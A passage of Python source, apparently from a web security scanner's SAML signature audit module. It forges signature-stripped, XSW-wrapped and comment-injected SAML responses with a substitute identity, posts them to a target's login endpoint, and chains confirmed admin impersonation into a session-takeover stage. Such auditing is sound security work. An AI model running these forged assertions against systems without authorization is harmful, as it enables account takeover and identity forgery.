            "post_error": result.get("error", ""),
            "discovery_method": "deep_scan_xsw_extended",
            "_payload_private": payload,
        }

    # ── STAGE 5: VERIFY ──────────────────────────────────────────
    async def verify(self, ctx: ScanContext, finding: dict) -> Optional[dict]:
        # Reject non-accepted findings before they consume verify time.
        # They still surface as INFO via the finding rules (rule_clean_*).
        if not finding.get("accepted"):
            finding["confidence"] = "INFO"
            finding["verification_method"] = "no_acceptance_signal"
            return finding

        acs_url = ctx.state.get("acs_url") or ""
        root = ctx.state.get("saml_xml")
        kind = finding.get("kind") or ""

        # For audience/expiry/replay we can't change the NameID (the test
        # premise is different) - mark as CONFIRMED based on the acceptance
        # itself, since the signal already demonstrates the gap.
        if kind in ("audience_mismatch", "expired_assertion",
                     "replay_attack_3x"):
            finding["confidence"] = "CONFIRMED"
            finding["verification_method"] = (
                f"sp_accepted_{kind}_payload_with_strict_signal")
            return finding

        # For XSW + signature stripping + comment injection: re-send the
        # SAME variant builder but with a DIFFERENT NameID. If the SP
        # also accepts the new identity, the bypass is reproducible.
        builder_for_kind = {
            "xsw_clone_sibling": _xsw1_clone_sibling,
            "xsw_wrap_extensions": _xsw3_wrap_in_extensions,
            "xsw_clone_after": _xsw4_clone_after,
            "xsw_wrap_object": _xsw7_wrap_in_object,
            "xsw_multi_assertion": _xsw8_multi_assertion,
        }
        retest_payload = ""
        retest_identity = "attacker_retest@target.com"
        if kind == "signature_stripping":
            # Strip + change NameID to retest identity
            etree, ok = _lxml()
            if ok and root is not None:
                try:
                    stripped = copy.deepcopy(root)
                    for sig in list(stripped.iter(f"{{{NS_DS}}}Signature")):
                        parent = sig.getparent()
                        if parent is not None:
                            parent.remove(sig)
                    nid = _find_first(stripped, "NameID", ns=NS_SAML2)
                    if nid is not None:
                        nid.text = retest_identity
                    retest_payload = _encode_saml(stripped)
                except Exception:
                    retest_payload = ""
        elif kind == "comment_injection_nameid":
            # Re-do comment injection with different forged identity
            real_user = ""
            if root is not None:
                rn = _find_first(root, "NameID", ns=NS_SAML2)
                real_user = (rn.text or "user@victim.com") if rn is not None \
                    else "user@victim.com"
            retest_payload = _comment_injection_nameid(
                root, real_user, retest_identity)
        elif kind in builder_for_kind:
            retest_payload = builder_for_kind[kind](root, retest_identity)

        if not retest_payload:
            finding["confidence"] = "SUSPECTED"
            finding["verification_method"] = "could_not_build_retest_payload"
            return finding

        r = await _post_saml_response(acs_url, retest_payload)
        if r.get("accepted"):
            finding["confidence"] = "CONFIRMED"
            finding["verification_method"] = (
                "saml_xsw_retest_with_different_identity")
            finding["retest_identity"] = retest_identity
            finding["retest_signal"] = r.get("signal", "")
        else:
            finding["confidence"] = "SUSPECTED"
            finding["verification_method"] = (
                "first_send_accepted_retest_rejected_possibly_session_specific")
        return finding

    # ── STAGE 6: PRIVILEGE CHECK ─────────────────────────────────
    async def privilege_check(self, ctx: ScanContext, finding: dict) -> dict:
        kind = finding.get("kind") or ""
        forged = finding.get("forged_nameid") or ""
        if kind == "audience_mismatch":
            finding["privilege"] = "audience_confusion"
            return finding
        if kind == "expired_assertion":
            finding["privilege"] = "expired_assertion_accepted"
            return finding
        if kind == "replay_attack_3x":
            finding["privilege"] = "replay_no_protection"
            return finding
        if kind == "signature_stripping":
            finding["privilege"] = "signature_stripping"
            return finding
        # XSW + comment-injection are NameID-identity attacks
        finding["privilege"] = _classify_identity(forged)
        return finding

    # ── STAGE 7: CHAIN HANDOFF ───────────────────────────────────
    async def chain_handoff(self, ctx: ScanContext,
                              findings: list[dict]) -> list[str]:
        confirmed = [f for f in findings
                     if f.get("confidence") == "CONFIRMED"]
        if not confirmed:
            return []
        next_scanners: list[str] = []
        # admin_impersonation -> post_exploit_saml_session_takeover
        if any(f.get("privilege") == "admin_impersonation" for f in confirmed):
            next_scanners.append("post_exploit_saml_session_takeover")
        # Any signature bypass -> session_predict_audit (cookie may be weak)
        sig_bypass_kinds = ("xsw_clone_sibling", "xsw_wrap_extensions",
                             "xsw_clone_after", "xsw_wrap_object",
                             "xsw_multi_assertion", "signature_stripping",
                             "comment_injection_nameid")
        if any(f.get("kind") in sig_bypass_kinds for f in confirmed):
            if "session_predict_audit" not in next_scanners:
                next_scanners.append("session_predict_audit")
        # Stamp on each confirmed finding so ChainExecutor sees it
        for f in confirmed:
            f["chain_next"] = list(next_scanners)
        return next_scanners


# ════════════════════════════════════════════════════════════════════
#  Endpoint wrapper
# ════════════════════════════════════════════════════════════════════


@router.post("/api/password/saml_signature_audit")
async def password_saml_signature_audit(req: SamlSignatureAuditRequest,
                                          _=Depends(verify_scan_quota)):
    scanner = SamlSignatureAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=SAML_SIGNATURE_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


def register(app):
    app.include_router(router)


# ════════════════════════════════════════════════════════════════════
#  Chain registry registration - upstream scanners (web auth flow
#  discovery, IdP enumeration) trigger us via _chain_callable.
# ════════════════════════════════════════════════════════════════════


async def _chain_callable(target: str, options: dict, jwt_token=None) -> dict:
    """ChainExecutor entry point for upstream SAML-aware scanners."""
    opts = options or {}
    req = SamlSignatureAuditRequest(target=target, options=opts)
    scanner = SamlSignatureAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=SAML_SIGNATURE_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


from tools._methodology import chain_registry
chain_registry.register("saml_signature_audit", _chain_callable)
